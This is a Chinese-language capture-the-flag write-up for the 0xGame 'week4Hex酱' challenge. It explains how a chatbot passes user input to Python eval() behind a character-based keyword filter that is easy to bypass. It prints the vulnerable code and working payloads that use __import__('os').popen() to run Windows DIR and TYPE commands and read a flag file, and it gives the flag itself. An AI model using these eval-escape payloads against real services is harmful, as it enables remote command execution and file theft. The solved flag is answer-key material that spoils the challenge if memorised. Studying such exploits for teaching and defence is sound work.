# week4Hex酱

## 题目简述

题目是聊天机器人提供的“Python 表达式执行”功能。消息必须写成 `print(...)`，服务端去掉外层后调用 `eval()`；虽然存在关键字过滤，但过滤实现错误且没有禁止 `__import__`，因此可以导入 `os`、调用 `popen()` 执行 Windows 命令，最终读取桌面上的 flag 文件。

## 解题过程

仓库中没有这一题的服务端目录，现有题解保留了当时泄露的核心源码。执行入口等价于：

```python
if msg[:6] == "print(" and msg[-1] == ")":
    expression = msg[6:-1]
    if py_filter(expression)[0]:
        result = eval(expression)
```

过滤器并不是检查关键字是否为输入的子串，而是逐字符判断：

```python
def keyword_filter(keyword, msg):
    for char in keyword:
        if char not in msg:
            return False
    return True
```

只有当某个关键字的每一种字符都曾在输入的任意位置出现时，它才会拦截；字符顺序和连续性都不重要。这个规则区分大小写，而黑名单又没有包含 `__import__`、`os` 或 `popen`。目标运行在 Windows 上，`DIR`、`TYPE` 等命令不区分大小写，因此用大写命令还能减少触发小写字符集合的机会。

先用简洁输出模式枚举桌面：

```python
print(__import__('os').popen('DIR /B %USERPROFILE%\\DESKTOP').read())
```

返回列表中包含：

```text
here_is_flag.txt
```

随后直接读取文件；命令和文件名均使用大写：

```python
print(__import__('os').popen('TYPE %USERPROFILE%\\DESKTOP\\HERE_IS_FLAG.TXT').read())
```

服务当时返回：

```text
#0xGame{621a9c2d-0f24-40fc-b5e2-8d8018e5165b}
```

行首 `#` 是机器人响应的显示前缀，实际 flag 为：

```text
0xGame{621a9c2d-0f24-40fc-b5e2-8d8018e5165b}
```

## 方法总结

本题有两层问题：第一层是把用户表达式直接交给 `eval()`，第二层是错误地把“关键字包含”实现成“关键字所有字符是否散落在输入中”。利用未过滤的 `__import__('os').popen()` 即可进入系统命令执行；结合 Windows 命令大小写不敏感的特性，用 `DIR /B` 找到目标文件，再用 `TYPE` 读取即可。无需保留冗长目录输出，也不需要额外外链。
